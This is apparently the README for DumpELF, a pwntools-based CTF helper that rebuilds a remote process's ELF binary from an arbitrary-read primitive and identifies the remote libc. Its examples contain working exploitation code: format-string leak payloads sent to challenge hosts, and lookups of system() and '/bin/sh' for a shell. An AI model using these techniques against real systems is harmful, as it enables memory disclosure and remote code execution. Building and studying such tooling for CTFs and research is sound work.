# DumpELF

Remote ELF dumper. Given an arbitrary-read primitive and any valid pointer into a running process, reconstruct the binary as a loadable ELF file — and optionally identify and download the remote libc.

The core idea is the same as extracting an ELF from a coredump, applied to live remote memory.

---

## Quickstart

```python
from doglib.dumpelf import DumpELF

def leak(addr):
    # your arbitrary read — return bytes at addr
    io.sendline(b"read " + str(addr).encode())
    return io.recv(8)

d = DumpELF(leak, known_ptr)   # any pointer inside the binary works
d.dump("./target_dump")        # write reconstructed ELF to disk
libc = d.libc                  # identify + auto-download remote libc
```

---

## How it works

```
arbitrary read + any pointer
         │
         ▼
 ┌──────────────────────────────────────────────────────────────┐
 │  DumpELF                                                     │
 │                                                              │
 │  1. Scan backwards by page (0x1000) to find \x7fELF magic   │
 │     → binary base address                                    │
 │                                                              │
 │  2. Parse ELF + program headers from memory                  │
 │     → list of PT_LOAD segments                               │
 │                                                              │
 │  3. Read each segment via the leak primitive                  │
 │     → raw memory dict {vaddr: bytes}                         │
 │                                                              │
 │  4. Reconstruct a valid ELF:                                 │
 │     - Correct ELF + program headers                          │
 │     - Rebuilt section headers (.text, .got.plt, .dynamic…)   │
 │     - GOT patched back to PLT stubs (restores lazy binding)  │
 │     - DT_DEBUG zeroed (prevents crash in new process)        │
 │                                                              │
 │  5. Walk the link_map via DT_DEBUG / PLTGOT                  │
 │     → all loaded library names + base addresses              │
 │                                                              │
 │  6. Identify libc:                                           │
 │     - Build ID extraction from PT_NOTE → libcdb lookup       │
 │     - Fallback: version string scan ("GNU C Library …")      │
 └──────────────────────────────────────────────────────────────┘
```

---

## Setup

```python
from doglib.dumpelf import DumpELF
```

The leak primitive can be either a raw callable or a pwntools `MemLeak` object. If it's a callable, it's automatically wrapped.

**Callable form** (most common):
```python
def leak(addr):
    # must return bytes starting at addr (at least 1 byte, ideally 8)
    # return None on read failure
    ...
    return data

d = DumpELF(leak, some_leaked_ptr)
```

**MemLeak form:**
```python
from pwnlib.memleak import MemLeak
ml = MemLeak(leak_fn, reraise=False)
d = DumpELF(ml, some_leaked_ptr)
```

**Optional hint:** If you already have a pwntools `ELF` object for the binary (e.g. you have a copy of the binary locally), pass it to speed up base-finding:
```python
from pwn import ELF
elf = ELF("./target")
d = DumpELF(leak, some_ptr, elf=elf)
```

---

## Dumping the binary

```python
# Write reconstructed ELF to disk, also returns bytes
elf_bytes = d.dump("./target_dump")

# Or just get the bytes without writing
elf_bytes = d.dump()
```

The reconstructed ELF is immediately usable with pwntools:
```python
from pwn import ELF
reconstructed = ELF("./target_dump", checksec=False)
print(hex(reconstructed.sym["main"]))
```

And it should actually run:
```python
import subprocess
import os, stat
os.chmod("./target_dump", os.stat("./target_dump").st_mode | stat.S_IEXEC)
subprocess.run(["./target_dump", "--some-flag"])
```

---

## Discovering loaded libraries

```python
# Dict of {library_name_bytes: base_address}
print(d.bases)
# {b'': 0x400000, b'/lib/x86_64-linux-gnu/libc.so.6': 0x7f..., ...}
```

Dump a specific library by name (substring match):
```python
libc_bytes = d.dump_lib("libc", "./libc_dump.so")
ld_bytes   = d.dump_lib("ld")
```

---

## Identifying the remote libc

```python
libc = d.libc
```

`d.libc` tries two strategies in order:

1. **Build ID** — reads the `NT_GNU_BUILD_ID` note from the remote libc's PT_NOTE segment and queries [libcdb](https://github.com/Gallopsled/pwntools-db) for a matching binary. If found, the libc file is downloaded locally.

2. **Version string** — scans the dumped libc segments for a glibc banner string (`"GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.5)"`, etc.) and logs the version for manual lookup.

If successful, `.libc` returns a pwntools `ELF` object with its address already set to the remote base:

```python
libc = d.libc
if libc:
    print(hex(libc.sym["system"]))   # remote address of system()
    print(hex(libc.sym["__free_hook"]))
```

---

## Other properties

| Property | Description |
|---|---|
| `d.base` | Remote base address of the binary |
| `d.elfclass` | `32` or `64` |
| `d.elftype` | `'EXEC'` (non-PIE) or `'DYN'` (PIE) |
| `d.is_pie` | `True` if PIE |
| `d.segments` | `{vaddr: bytes}` dict of all PT_LOAD segments |
| `d.bases` | `{name: base}` dict from the link map |
| `d.link_map` | Address of the runtime `link_map` struct |
| `d.dynamic` | Address of the PT_DYNAMIC segment |

---

## Examples

### Full CTF workflow

```python
from pwn import *
from doglib.dumpelf import DumpELF

context.arch = "amd64"
io = remote("chall.ctf.example", 1337)

# Step 1: get a pointer (from a leak, GOT entry, etc.)
io.recvuntil(b"ptr: ")
leaked_ptr = int(io.recvline(), 16)

# Step 2: arbitrary read via format string / AAR primitive
def leak(addr):
    io.sendline(b"%s|" + p64(addr))
    return io.recvuntil(b"|")[:-1].ljust(8, b"\x00")

# Step 3: dump the binary
d = DumpELF(leak, leaked_ptr)
d.dump("./dumped")

# Step 4: identify libc
libc = d.libc
if libc:
    system = libc.sym["system"]
    binsh  = next(libc.search(b"/bin/sh\x00"))
    log.success(f"system @ {hex(system)}, /bin/sh @ {hex(binsh)}")
```

---

### Format string blind challenge

```python
from pwn import *
from doglib.dumpelf import DumpELF

io = remote("chall.ctf.example", 1337)

# Format string read primitive — assumes binary leaks via %s at offset 6
def leak(addr):
    payload = b"%" + str(6).encode() + b"$s|" + p64(addr)
    io.sendline(payload)
    data = io.recvuntil(b"|", drop=True)
    return data.ljust(8, b"\x00") if data else None

# Leak a GOT entry address first (e.g. from a separate fmt read)
got_leak = 0x404018   # known from a partial run

d = DumpELF(leak, got_leak)
print(f"Found base: {hex(d.base)}")
print(f"PIE: {d.is_pie}")

d.dump("./blind_target")
log.success("Binary reconstructed, now analyze it locally")
```

---

### Arbitrary read via custom socket protocol

```python
from pwn import *
from doglib.dumpelf import DumpELF
from pwnlib.memleak import MemLeak

io = remote("chall.ctf.example", 9999)

def raw_leak(addr):
    io.send(p64(addr))
    return io.recv(8)

# MemLeak adds caching + helper methods (.q, .d, .compare, etc.)
ml = MemLeak(raw_leak, reraise=False)

# If we have a local copy of the binary with the correct non-PIE address:
from pwn import ELF
elf = ELF("./target_nopie")   # helps skip the page scan
d = DumpELF(ml, elf.got["puts"], elf=elf)

d.dump("./target_dump")

# Walk loaded libs
for name, base in d.bases.items():
    if name:
        log.info(f"{name.decode(errors='replace')} @ {hex(base)}")

# Get libc
libc = d.libc
```

---

### Dumping libc directly

If you have a pointer inside libc (e.g. a leaked libc address), you can dump libc itself:

```python
d_libc = DumpELF(leak, libc_leak)
d_libc.dump("./libc_dump.so")

from pwn import ELF
l = ELF("./libc_dump.so", checksec=False)
print(hex(l.sym["system"]))   # correct file-relative offset
l.address = libc_base         # set runtime base
print(hex(l.sym["system"]))   # remote address
```

Or from a `DumpELF` for the main binary:
```python
d = DumpELF(leak, binary_ptr)
d.dump_lib("libc", "./libc_dump.so")
```

---

## Notes and limitations

- **What runs:** The reconstructed ELF is executable because the GOT is patched to restore lazy binding, and `DT_DEBUG` is zeroed to prevent the dynamic linker from crashing. The binary will correctly resolve symbols at runtime.

- **What's broken:** Global variables will have their runtime values at the time of the dump, not their initial values. This is expected — it's a memory dump, not a recompile. For exploit analysis this is usually fine.

- **PIE:** Fully supported. Virtual addresses in the reconstructed file are stored as offsets (file-relative), matching what you'd get from the original compiler output.

- **CET binaries:** Supported. Modern GCC emits CET (Control-flow Enforcement Technology) binaries with `endbr64` PLT stubs — the GOT is patched to point to the correct stub entry accordingly.

- **RELRO:** Full RELRO binaries have their GOT already resolved (no lazy binding), so GOT patching is skipped. The reconstructed binary should still run since the resolved values were captured in the dump.

- **32-bit:** Supported but less tested than 64-bit.

- **libcdb:** The build-ID lookup requires network access and an up-to-date pwntools libcdb. If it fails, identify the libc manually using the version string and look it up on [libc.rip](https://libc.rip) or your distro's package archive.
